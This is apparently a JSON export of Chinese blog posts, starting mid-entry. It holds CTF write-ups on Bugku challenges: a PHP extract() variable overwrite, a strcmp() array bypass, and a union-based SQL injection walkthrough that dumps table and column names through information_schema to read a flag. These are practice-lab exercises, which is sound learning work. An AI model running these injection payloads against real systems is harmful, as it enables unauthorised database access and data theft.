还请大佬指教邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"extract（）变量漏洞","slug":"extract（）变量漏洞","date":"2019-12-16T02:37:33.823Z","updated":"2019-03-09T00:45:11.325Z","comments":true,"path":"2019/12/16/extract（）变量漏洞/","link":"","permalink":"http://yoursite.com/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"php代码审计日志一（bugku extract变量覆盖）题目来源：bugku代码为：我们先了解一下extract（）函数之后我们再了解一下php中的extract（）漏洞 第一次我所构造的为：?shiyan=1&amp;flag=1但是不行我查了一些大佬的wp后发现有：之后我们就可以得到flag","categories":[],"tags":[]},{"title":"csdn_export_md","slug":"csdn_export_md","date":"2019-12-16T02:37:33.807Z","updated":"2019-03-09T23:40:53.875Z","comments":true,"path":"2019/12/16/csdn_export_md/","link":"","permalink":"http://yoursite.com/2019/12/16/csdn_export_md/","excerpt":"","text":"代码审计之strcmp（）漏洞先了解一下此漏洞：strcmp(str1,str2)比较两个字符串，如果相等就返回0。 在5.3版本前，如果传入的不是字符串，那么会报错，并且return 0，返回0就代表相等了。绕过strcmp就想办法传入数组吧，只需要v3[]=3即可。 之后我们通过一个题来做一个例子： 12345678910&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123;if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。&#x2F;&#x2F;比较两个字符串（区分大小写）die(&#39;Flag: &#39;.$flag);elseprint &#39;No&#39;;&#125;?&gt; 因此我们可以构造?a[]=1即可得到flag","categories":[],"tags":[]},{"title":"bugku成绩单","slug":"bugku成绩单","date":"2019-12-16T02:37:33.714Z","updated":"2019-03-09T08:42:51.179Z","comments":true,"path":"2019/12/16/bugku成绩单/","link":"","permalink":"http://yoursite.com/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/","excerpt":"","text":"bugku成绩单 详细解析1，我们首先分别输入1,2,3，均有输出我们输入1’没有回响因此我们可以判断存在sql注入2.我们分别输入 12341&#39; order by 1#1&#39; order by 2#1&#39; order by 3#1&#39; order by 4# 均有回响但是当我们使用 11&#39; order by 5# 时，没有回响因此我们可以根据此判断字段数为43，之后就是最精彩的地方了之后我们联合查询我们先输入注意（select好像tm的不是查询，，好像是赋值。。） 11&#39; union select 1,2,3,4# 没有显示有用的东西因为id=1 所以我们的东西被覆盖因此呢我们输入 15&#39; union select 1,2,3,database()# 即设置一个新的id，我们要select的值会显示在表上（覆盖）现在我们得到了一个数据库的名字之后就进行爆表5’union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#得到之后再进行获得里面的列‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#得到我们得到了列之后我们获取我们要得到的东西5’ union select 1,2,3,skctf_flag from fl4g#得到flag 之后我会写一些关于sql语句的总结","categories":[],"tags":[]}]}